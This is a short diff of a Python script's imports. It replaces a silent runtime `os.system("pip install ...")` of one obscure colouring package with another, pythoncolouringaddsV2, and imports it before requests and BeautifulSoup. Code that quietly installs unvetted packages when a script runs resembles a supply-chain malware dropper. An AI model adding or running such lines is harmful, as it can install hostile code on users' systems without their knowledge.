@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloradds")
-import pipcoloradds
+os.system("pip install pythoncolouringaddsV2")
+import pythoncolouringaddsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
